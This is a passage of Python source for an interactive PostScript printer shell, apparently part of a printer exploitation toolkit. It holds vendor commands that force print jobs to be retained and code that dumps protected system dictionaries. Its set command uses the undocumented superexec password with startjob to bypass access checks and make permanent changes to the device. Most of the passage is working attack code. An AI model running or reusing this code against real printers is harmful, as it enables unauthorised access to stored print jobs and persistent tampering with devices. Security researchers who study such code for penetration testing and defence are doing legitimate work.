    << /Collate true /CollateDetails <<         /Type 8 /Hold 1 >> >> setpagedevice  % quick copy (HP)
    << /Collate true /CollateDetails <<         /Type 8 /Hold 2 >> >> setpagedevice  % stored job (HP)
    << /Collate true /CollateDetails << /Mode 0 /Type 8 /Hold 1 >> >> setpagedevice  % quick copy (Kyocera)
    << /Collate true /CollateDetails << /Mode 0 /Type 8 /Hold 2 >> >> setpagedevice  % stored job (Kyocera)
    << /Collate true /CollateDetails << /Mode 0                 >> >> setpagedevice  % permanent job storage (Kyocera)
    <<               /CollateDetails << /Hold 0 /Type 8         >> >> setpagedevice  % disable job retention (HP)

    **************************** CANON *********************************
    << /CNJobExecMode store >> setpagedevice
    << /CNJobExecMode hold  >> setpagedevice

    **************************** BROTHER *******************************
    << /BRHold 2 /BRHoldType 0 >> setpagedevice

    **************************** XEROX #1 ******************************
    userdict /XJXsetraster known { 1 XJXsetraster } if

    **************************** XEROX #2 ******************************
    userdict begin /xerox$holdjob 1 def end
    /EngExe /ProcSet resourcestatus
    {pop pop /EngExe /ProcSet findresource /HoldJob known
    {false /EngExe /ProcSet findresource /HoldJob get exec} if} if

    **************************** TOSHIBA *******************************
    /dscInfo where {
      pop
      dscInfo /For known {
        <</TSBPrivate 100 string dup 0 (DSSC PRINT USERLOGIN=)
          putinterval dup 21 dscInfo /For get putinterval
        >> setpagedevice
      } if
      dscInfo /Title known {
        <</TSBPrivate 100 string dup 0 (DSSC JOB NAME=)
          putinterval dup 14 dscInfo /Title get putinterval
        >> setpagedevice
      } if
    << /TSBPrivate (DSSC PRINT PRINTMODE=HOLD) >> setpagedevice
    }{
      << /TSBPrivate (DSSC PRINT USERLOGIN=CUPS User) >> setpagedevice
      << /TSBPrivate (DSSC JOB NAME=CUPS Document)    >> setpagedevice
      << /TSBPrivate (DSSC PRINT PRINTMODE=HOLD)      >> setpagedevice
    } ifelse"
  '''

  # ====================================================================

  # ------------------------[ known <operator> ]-------------------------
  def do_known(self, arg):
    "List supported PostScript operators:  known <operator>"
    if arg:
      functionlist = {'User-supplied Operators': arg.split()}
    else:
      functionlist = operators.oplist

### may want to find unknown ops using: systemdict {dup type /operatortype eq {exch == pop}{pop pop} ifelse} forall

    # ask interpreter if functions are known to systemdict
    for desc, funcs in sorted(functionlist.items()):
      output().chitchat(desc)
      commands = ['(' + func  + ': ) print systemdict /'
               + func + ' known ==' for func in funcs]
      str_recv = self.cmd(c.EOL.join(commands), False)
      for line in str_recv.splitlines():
        output().green(line) if " true" in line else output().warning(line)

  # ------------------------[ search <key> ]----------------------------
  def do_search(self, arg):
    "Search all dictionaries by key:  search <key>"
    output().info(self.cmd('(' + arg + ') where {(' + arg + ') get ==} if'))

  # ------------------------[ dicts ]-----------------------------------
  def do_dicts(self, arg):
    "Return a list of dictionaries and their permissions."
    output().info("acl   len   max   dictionary")
    output().info("────────────────────────────")
    for dict in self.options_dump:
      str_recv = self.cmd('1183615869 ' + dict + '\n'
                          'dup rcheck {(r) print}{(-) print} ifelse\n'
                          'dup wcheck {(w) print}{(-) print} ifelse\n'
                          'dup xcheck {(x) print}{(-) print} ifelse\n'
                          '( ) print dup length 128 string cvs print\n'
                          '( ) print maxlength  128 string cvs print')
      if len(str_recv.split()) == 3:
        output().info("%-5s %-5s %-5s %s" % tuple(str_recv.split() + [dict]))

  # ------------------------[ dump <dict> ]-----------------------------
  def do_dump(self, arg, resource=False):
    "Dump all values of a dictionary:  dump <dict>"
    dump = self.dictdump(arg, resource)
    if dump: output().psdict(dump)

  def help_dump(self):
    print("Dump dictionary:  dump <dict>")
    # print("If <dict> is empty, the whole dictionary stack is dumped.")
    print("Standard PostScript dictionaries:")
    if len(self.options_dump) > 0: last = self.options_dump[-1]
    for dict in self.options_dump: print(('└─ ' if dict == last else '├─ ') + dict)

  # undocumented ... what about proprietary dictionary names?
  options_dump = ('systemdict', 'statusdict', 'userdict', 'globaldict',
        'serverdict', 'errordict', 'internaldict', 'currentpagedevice',
        'currentuserparams', 'currentsystemparams')

  def complete_dump(self, text, line, begidx, endidx):
    return [cat for cat in self.options_dump if cat.startswith(text)]

  # define alias
  complete_browse = complete_dump

  def dictdump(self, dict, resource):
    superexec = False # TBD: experimental privilege escalation
    if not dict: # dump whole dictstack if optional dict parameter is empty
      # dict = 'superdict'
      # self.chitchat("No dictionary given - dumping everything (might take some time)")
      return self.onecmd("help dump")
    # recursively dump contents of a postscript dictionary and convert them to json
    str_send = '/superdict {<< /universe countdictstack array dictstack >>} def\n'  \
               '/strcat {exch dup length 2 index length add string dup\n'           \
               'dup 4 2 roll copy length 4 -1 roll putinterval} def\n'              \
               '/remove {exch pop () exch 3 1 roll exch strcat strcat} def\n'       \
               '/escape { {(")   search {remove}{exit} ifelse} loop \n'             \
               '          {(/)   search {remove}{exit} ifelse} loop \n'             \
               '          {(\\\) search {remove}{exit} ifelse} loop } def\n'        \
               '/clones 220 array def /counter 0 def % performance drawback\n'      \
               '/redundancy { /redundant false def\n'                               \
               '  clones {exch dup 3 1 roll eq {/redundant true def} if} forall\n'  \
               '  redundant not {\n'                                                \
               '  dup clones counter 3 2 roll put  % put item into clonedict\n'     \
               '  /counter counter 1 add def       % auto-increment counter\n'      \
               '  } if redundant} def              % return true or false\n'        \
               '/wd {redundancy {pop q (<redundant dict>) p q bc s}\n'              \
               '{bo n {t exch q 128 a q c dump n} forall bc bc s} ifelse } def\n'   \
               '/wa {q q bc s} def\n'                                               \
               '% /wa {ao n {t dump n} forall ac bc s} def\n'                       \
               '/n  {(\\n) print} def               % newline\n'                    \
               '/t  {(\\t) print} def               % tabulator\n'                  \
               '/bo {({)   print} def              % bracket open\n'                \
               '/bc {(})   print} def              % bracket close\n'               \
               '/ao {([)   print} def              % array open\n'                  \
               '/ac {(])   print} def              % array close\n'                 \
               '/q  {(")   print} def              % quote\n'                       \
               '/s  {(,)   print} def              % comma\n'                       \
               '/c  {(: )  print} def              % colon\n'                       \
               '/p  {                  print} def  % print string\n'                \
               '/a  {string cvs        print} def  % print any\n'                   \
               '/pe {escape            print} def  % print escaped string\n'        \
               '/ae {string cvs escape print} def  % print escaped any\n'           \
               '/perms { readable  {(r) p}{(-) p} ifelse\n'                         \
               '         writeable {(w) p}{(-) p} ifelse } def\n'                   \
               '/rwcheck { % readable/writeable check\n'                            \
               '  dup rcheck not {/readable  false def} if\n'                       \
               '  dup wcheck not {/writeable false def} if perms } def\n'           \
               '/dump {\n'                                                          \
               '  /readable true def /writeable true def\n'                         \
               '  dup type bo ("type": ) p q 16 a q s\n'                            \
               '  %%%% check permissions %%%\n'                                     \
               '  ( "perms": ) p q\n'                                               \
               '  dup type /stringtype eq {rwcheck} {\n'                            \
               '    dup type /dicttype eq {rwcheck} {\n'                            \
               '      dup type /arraytype eq {rwcheck} {\n'                         \
               '        dup type /packedarraytype eq {rwcheck} {\n'                 \
               '          dup type /filetype eq {rwcheck} {\n'                      \
               '            perms } % inherit perms from parent\n'                  \
               '          ifelse} ifelse} ifelse} ifelse} ifelse\n'                 \
               '  dup xcheck {(x) p}{(-) p} ifelse\n'                               \
               '  %%%% convert values to strings %%%\n'                             \
               '  q s ( "value": ) p\n'                                             \
               '  %%%% on invalidaccess %%%\n'                                      \
               '  readable false eq {pop q (<access denied>) p q bc s}{\n'          \
               '  dup type /integertype     eq {q  12        a q bc s}{\n'          \
               '  dup type /operatortype    eq {q 128       ae q bc s}{\n'          \
               '  dup type /stringtype      eq {q           pe q bc s}{\n'          \
               '  dup type /booleantype     eq {q   5        a q bc s}{\n'          \
               '  dup type /dicttype        eq {            wd       }{\n'          \
               '  dup type /arraytype       eq {            wa       }{\n'          \
               '  dup type /packedarraytype eq {            wa       }{\n'          \
               '  dup type /nametype        eq {q 128       ae q bc s}{\n'          \
               '  dup type /fonttype        eq {q  30       ae q bc s}{\n'          \
               '  dup type /nulltype        eq {q pop (null) p q bc s}{\n'          \
               '  dup type /realtype        eq {q  42        a q bc s}{\n'          \
               '  dup type /filetype        eq {q 100       ae q bc s}{\n'          \
               '  dup type /marktype        eq {q 128       ae q bc s}{\n'          \
               '  dup type /savetype        eq {q 128       ae q bc s}{\n'          \
               '  dup type /gstatetype      eq {q 128       ae q bc s}{\n'          \
               '  (<cannot handle>) p}\n'                                           \
               '  ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse}\n'\
               '  ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse} ifelse}\n'\
               'def\n'
    if not resource: str_send += '(' + dict + ') where {'
    str_send += 'bo 1183615869 ' + dict + ' {exch q 128 a q c dump n} forall bc'
    if not resource: str_send += '}{(<nonexistent>) print} ifelse'
    str_recv = self.clean_json(self.cmd(str_send))
    if str_recv == '<nonexistent>':
      output().info("Dictionary not found")
    else: # convert ps dictionary to json
      return json.loads(str_recv, object_pairs_hook=collections.OrderedDict, strict=False)

  # bad practice
  def clean_json(self, string):
    string = re.sub(",[ \t\r\n]+}", "}", string)
    string = re.sub(",[ \t\r\n]+\]", "]", string)
    return unicode(string, errors='ignore')

  # ------------------------[ resource <category> [dump] ]--------------
  def do_resource(self, arg):
    arg = re.split("\s+", arg, 1)
    cat, dump = arg[0], len(arg) > 1
    self.populate_resource()
    if cat in self.options_resource:
      str_send = '(*) {128 string cvs print (\\n) print}'\
                 ' 128 string /' + cat + ' resourceforall'
      items = self.cmd(str_send).splitlines()
      for item in sorted(items):
        output().info(item)
        if dump: self.do_dump('/' + item + ' /' + cat + ' findresource', True)
    else:
      self.onecmd("help resource")

  def help_resource(self):
    self.populate_resource()
    print("List or dump PostScript resource:  resource <category> [dump]")
    print("Available resources on this device:")
    if len(self.options_resource) > 0: last = sorted(self.options_resource)[-1]
    for res in sorted(self.options_resource): print(('└─ ' if res == last else '├─ ') + res)

  options_resource = []
  def complete_resource(self, text, line, begidx, endidx):
    return [cat for cat in self.options_resource if cat.startswith(text)]

  # retrieve available resources
  def populate_resource(self):
    if not self.options_resource:
      str_send = '(*) {print (\\n) print} 128 string /Category resourceforall'
      self.options_resource = self.cmd(str_send).splitlines()

  # ------------------------[ set <key=value> ]-------------------------
  def do_set(self, arg):
    "Set key to value in topmost dictionary:  set <key=value>"
    arg = re.split("=", arg, 1)
    if len(arg) > 1:
      key, val = arg
      # make changes permanent
      str_send = 'true 0 startjob {\n'
      # flavor No.1: put (associate key with value in dict)
      str_send += '/' + key + ' where {/' + key + ' ' + val + ' put} if\n'
      # flavor No.2: store (replace topmost definition of key)
      str_send += '/' + key + ' ' + val + ' store\n'
      # flavor No.3: def (associate key and value in userdict)
      str_send += '/' + key + ' ' + val + ' def\n'
      # ignore invalid access
      str_send += '} 1183615869 internaldict /superexec get exec'
      self.cmd(str_send, False)
    else:
      self.onecmd("help set")

  # ------------------------[ config <setting> ]------------------------
  def do_config(self, arg):
    arg = re.split("\s+", arg, 1)
    (arg, val) = tuple(arg) if len(arg) > 1 else (arg[0], None)
    if arg in self.options_config.keys():
      key = self.options_config[arg]
      if arg == 'copies' and not val: return self.help_config()
      output().psonly()
      val = val or 'currentpagedevice /' + key + ' get not'
      output().info(self.globalcmd(
        'currentpagedevice /' + key + ' known\n'
        '{<< /' + key + ' ' + val + ' >> setpagedevice\n'
        '(' + key + ' ) print currentpagedevice /' + key + ' get\n'
        'dup type /integertype eq {(= ) print 8 string cvs print}\n'
        '{{(enabled)}{(disabled)} ifelse print} ifelse}\n'
        '{(Not available) print} ifelse'))
    else:
      self.help_config()

  def help_config(self):
    print("Change printer settings:  config <setting>")
    print("  duplex      - Set duplex printing.")
    print("  copies #    - Set number of copies.")
    print("  economode   - Set economic mode.")
    print("  negative    - Set negative print.")
    print("  mirror      - Set mirror inversion.")

  options_config = {'duplex'   : 'Duplex',
                    'copies'   : 'NumCopies',
                    'economode': 'EconoMode',
                    'negative' : 'NegativePrint',
                    'mirror'   : 'MirrorPrint'}

  def complete_config(self, text, line, begidx, endidx):
    return [cat for cat in self.options_config if cat.startswith(text)]
